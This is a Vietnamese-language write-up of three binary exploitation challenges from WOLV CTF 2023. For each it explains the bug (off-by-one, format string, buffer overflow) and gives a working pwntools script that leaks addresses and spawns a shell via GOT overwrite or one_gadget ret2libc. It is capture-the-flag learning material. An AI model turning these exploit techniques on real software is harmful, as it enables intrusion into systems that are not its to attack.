# WOLV CTF 2023
<details>
<summary>1. WTML </summary>
    
- Bài này cho ta 1 file source, 1 file binary và 1 file docker, 1 file libc
- Đầu tiên ta `checksec` 
    
![](https://i.imgur.com/dXXX6AD.png)

- Bài No RELRO cùng với cho sẵn file libc nên nghi mùi leak đâu đây
- Tiếp theo mở file source lên đọc, khá dài và ta phân tích từng func như sau.
- Đầu tiên hàm main yêu cầu ta nhập `user_message` dài 0x20 byte, nhưng khai báo là `user_message[0x20]`. Ở đây bị lỗi Off by one do cần thêm 1 byte làm null terminator
- Tiếp theo chương trình loop, mỗi vòng lặp yêu cầu ta nhập ký tự mới cần thay và ký tự mới để thay. Mặc định chương trình sẽ gọi hàm `replace_tag_v1`, ngoài ra cũng có hàm `replace_tag_v2` bị lỗi format strings.
    
![](https://i.imgur.com/j8khRpm.png)

- Do đó mục tiêu của ta là làm sao để chuyển hướng chương trình qua `replace_tag_v2`. Ở đây ta thấy bắc buộc phải làm sao để id = 1. 
- Do cấp sẵn source nên mình build lại để add thêm mấy cái symbol trong source cho debug dễ hơn.
    
![](https://i.imgur.com/slrg3Zg.png)

- Tiếp theo ta gdb debug để coi lỗi off by one có thể lợi dụng để làm gì.
- Đầu tiên ta xem `user_message` và `replacer.id` ở đâu trong bộ nhớ.
    
![](https://i.imgur.com/KlL7pTs.png)

![](https://i.imgur.com/bsg5dRB.png)

- Nhìn vào thì ta thấy được byte tiếp theo tức `user_message[32]` chính là `replacer.id`
- Tiếp theo vào `replace_tag_v1` xem có thay đổi được `user_message[32]` không.

![](https://i.imgur.com/a93Ep5s.png)

- Ta thấy có `message[end_tag_index + 2] = to;` chính là lệnh hợp lý nhất để over bound mảng. Ta cần `message[32]= /x01` => `end_tag_index = 30` => `i = 30` => `start_tag_index = 27`. Mà để `start_tag_index = 27` thì ở vị trí thứ 27 phải là `<`,28 là `\x00`, 29 là `>`,30 là `<`, 31 là `/`, 32 byte `\x00` có sẵn. Từ vị trí 0 tới 26 muốn là gì cũng được, miễn sau xong hết là đủ 32 byte.
- Vậy khi đó ta overwrite index = 1 sẽ nhảy qua `replace_tag_v2` bị lỗi format string. Mà ở đây cho ta nhập vào stack + RELRO tắt nên đưa về dạng SGK overwrite GOT. Ở đây mình Overwrite got của `printf` thành `system`
- Vậy bài này chỉ khó chỗ lợi dụng off by one để overwrite index thành 1. Overwrite xong thì đưa về dạng SGK
- Kết hợp ý tưởng trên ta viết script: 
```python
from pwn import *
exe = ELF("testo")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process(exe.path)
'''
gdb.attach(p,
"""
b*replace_tag_v2
c
""")
input()
'''
p.sendafter(b'L!\n',b'%11$llx\x00bbbbbbbbbbbbbbbbbbb<\x00></')

p.sendlineafter(b'What tag would you like to replace [q to quit]?\n',b'\x00')
p.sendlineafter(b'With what new tag?\n',b'\x01')

p.sendlineafter(b'What tag would you like to replace [q to quit]?\n',b'a')
p.sendlineafter(b'With what new tag?\n',b'b')
p.recvuntil(b'[DEBUG] ')
leak_libc = int(p.recvn(12) ,16)
libc.address = leak_libc - 569197
print('libc : ',hex(libc.address))
p.sendlineafter(b'about v2: ',b'%18$llx')
p.recvuntil(b'Your respones: "')
leak_exe = int(p.recvn(12),16)
exe.address = leak_exe - 8360
print('exe : ',hex(exe.address))


p.sendlineafter(b'What tag would you like to replace [q to quit]?\n',b'a')
p.sendlineafter(b'With what new tag?\n',b'b')
write1 = libc.sym['system'] & 0xff
write2 = libc.sym['system'] >> 8 & 0xffff
payload = f'%{write1}c%12$hhn%{write2-write1}c%13$hn'.encode()
payload = payload.ljust(0x20,b'A')
payload += p64(exe.got['printf'])  + p64(exe.got['printf']+1)
p.sendlineafter(b'about v2: ',payload)

p.sendlineafter(b'What tag would you like to replace [q to quit]?\n',b'a')
p.sendlineafter(b'With what new tag?\n',b'b')
p.sendline(b'/bin/sh\x00')

p.interactive()
```
</details>

<details>
<summary>2. echo2 </summary>
    
- Bài này cho 1 file binary,1 file source,1 file libc
- Đầu tiên checksec

![](https://i.imgur.com/Rlqstf1.png)

- Tiếp theo vào IDA xem thử
    
![](https://i.imgur.com/EWv7VuW.png)

- Đọc code thì ta nhận thấy đề yêu cầu ta nhập v2 và chương trình lấy nhiêu đó byte nhập tiếp và `ptr` nên ở đây có lỗi buffer overflow.
- Ở đây PIE enable nên không thể leak libc bằng cách vào PLT được. Ta thây ret address của `echo` là địa chỉ của exe, ở đây ta có hướng overwrite 1 phần address này thành địa chỉ nào đó cũng trong exe được do offset không đổi.

![](https://i.imgur.com/7F5dNNI.png)
    

- Sau một hồi đọc code ta thấy ta cần nhảy vào main lại, trước khi nhảy thì có hàm `printf` in ra cái ta nhập vào. Do đó nó sẽ leak luôn cái địa chỉ main ta ret vào đến khi gặp byte null thì thôi. Do đó ở đây ta sẽ leak được exe.

![](https://i.imgur.com/v3OHxzQ.png)

- Ở đây ta nhẩy vào `main+5` do lúc đầu mình nhảy vào `main` bị xmm sigsegv. Ta thấy `main+5` chỉ khác ret address kia là byte `\x4c` nên ở đây ta chỉ cần overwrite 1 byte
- Sau khi leak được exe thì ở đây mình vào ROPgadget tìm pop_rdi nhưng không thấy => không control được rdi nên leak libc bằng cách khác.
- May mắn là trước khi `ret` ở `echo` thì rdi trỏ về `funlockfile` thuộc về libc => leak libc bằng cách overwrite bằng PLT puts. 

![](https://i.imgur.com/I4xbaro.png)

- Sau khi puts leak thì mình vào lại `echo` tìm `one_gadget` để ret2libc. Ở đây mình chọn cái này
    
![](https://i.imgur.com/4oJbvKP.png)

- Lúc đầu mình ret vào thì bị sigsegv, nhìn lại thì phải làm thoả điều kiện [rbp-0x78] ghi được. Ở đây mình overwrite `rpb` thành địa chỉ `bss+0x78`(để khi trừ ra ngay cái bss luôn)
- Script:
```python
from pwn import *
exe = ELF("challenge")
libc = ELF("libc.so.6")
p = process(exe.path)
gdb.attach(p,
"""
b*echo+123
c
""")
input()
p.sendlineafter(b'2\n',b'281')
payload = b'A'*278+b'L'+b'\x4c'
p.sendline(payload)
p.recvuntil(b'L')
leak = u64(p.recvline()[:-1] + b'\x00\x00')
exe.address = leak - 4684
print(hex(exe.address))

p.sendlineafter(b'2\n',b'296')
payload = b'A'*279+p64(exe.plt['puts']) + p64(exe.sym['echo'])
p.sendline(payload)

leak = p.recvline()
leak = p.recvline()
leak_lib = u64(p.recvline()[:-1] + b'\x00\x00')
libc.address = leak_lib - 401616
print("leak lib : ",hex(libc.address))
p.recvuntil(b'Echo2\n')
p.sendline(b'296')

payload=b'\x00'*271+p64(exe.bss()+0x78)+p64(exe.address + 0x000000000000101a) + p64(libc.address +0xebcf1)
p.send(payload)
p.interactive()
```
</details>

<details>
<summary>3. feeding </summary>
- Bài này cho ta file source và file binary
- Đầu tiên ta checksec
    
![](https://i.imgur.com/gkecsAO.png)

- Tiếp theo mình vào file source thì thấy khá dài và để đơn giản cho debug thì mình compile lại.
    
![](https://i.imgur.com/peFqSmh.png)

- Tiếp theo vào source, bài này khai báo struct khá nhiều và sài con trỏ để access vào dữ liệu trong struct. Cá nhân mình xem từng cái nó trỏ là 1 biến riêng lẽ để dễ hình dung vì xét về bản chất thì struct cũng là mấy biến nằm liên tục trên bộ nhớ.
- Ta phân tích từng hàm.
- Đầu tiên sẽ khởi tạo `flag` và đề dùng cái số trong file flag đó đưa vào cái `flag_map`. Mục đích của ta là leak số đó.
    
![](https://i.imgur.com/2LKn9JS.png)

- Tiếp theo sẽ chạy hàm loop cho ta các lựa chọn : `feed` - thêm vào `map` , `view` - để xem tên, và lựa chọn thoát.
- Hàm quan trọng sài xuyên suốt là `increment`. Ta thấy hàm đầu tiên hash chuỗi ta nhập để tìm index. `index` luôn từ 0->9. rồi check xem tên ta nhập có chưa, có rồi thì sẽ cộng vô weight, chưa thì thêm vào.

![](https://i.imgur.com/SSArcLQ.png)

- Ta phân tích tiếp hàm `hash_string` thì thấy cách nó hash rất đơn giản, chỉ lấy mã ascii của từng ký tự trong tên *31 rồi cộng lại hết thôi. Do đó ở đây ta có thể tìm được họ các string mà đều return về cùng 1 index

![](https://i.imgur.com/WLzFGLR.png)

- Dựa vào đều đó ta vào lại `increment` để xem thì nhận thấy hàm `loop` lặp 5 lần, mỗi vòng lặp ta có thể nhập string cùng hash ra 1 index thì lần thứ 5 sẽ overflow do `bin[index][i]` khai báo là `bin[10][4]` tức index max ta nhập được là `bin[9][3]`. => Có lỗi off by one

- Sau đó ta debug xem thử lỗi off by one này làm được gì thì thấy rằng nếu ta truy cập vào bin[9][4] sẽ thay đổi ret address của main bằng cách cộng hay trừ với `weight`

![](https://i.imgur.com/IOb5ApN.png)

![](https://i.imgur.com/nQFmogt.png)

- Để tạo được họ string mod 10 = 9 thì ta chỉ cần tạo chuỗi có một số 1 còn lại là bao nhiêu 'F' cũng được. Để giải thích điều này thì dựa vào đồng dư ta có (a+b+c)%d = a%d + b%d + c%d. Mà ord(F) tận cùng là 0 nên nhân với 31 rồi mod 10 cũng ra 0 (mod 10 tức lấy chữ số cuối cùng), (ord(a)*31) % 10= 9. 
- Vậy thì ta chỉ cần tính toán nên ret vào đâu để leak `weight` thì thấy trong hàm increment set sẵn arguments cho ta và có hàm `prints` để in ra => nhảy vào `prints` luôn. Thực tế ta nhảy vào `prints+5` để không bị `sigsegv` và ta tính ra offset cần trừ là -1286
    
![](https://i.imgur.com/l3iI6Ml.png)

- Script:
```python
ryan@ryanisme:~/ctf/problems/wolf/feeding$ cat lmao.py
from pwn import *
exe = ELF("test")
p = process(exe.path)

for i in range(0,4) :
        p.recvuntil(b'> ')
        p.sendline(b'1')
        p.sendlineafter(b' name: ',b'1'+b'F'*i)
        p.sendlineafter(b' them: ',b'100')
gdb.attach(p,
"""
b *increment
c
""")
input()
p.recvuntil(b'> ')
p.sendline(b'1')
p.sendlineafter(b' name: ',b'1'+b'F'*5)
p.sendlineafter(b' them: ',b'-1286')
p.interactive()
```
</details>
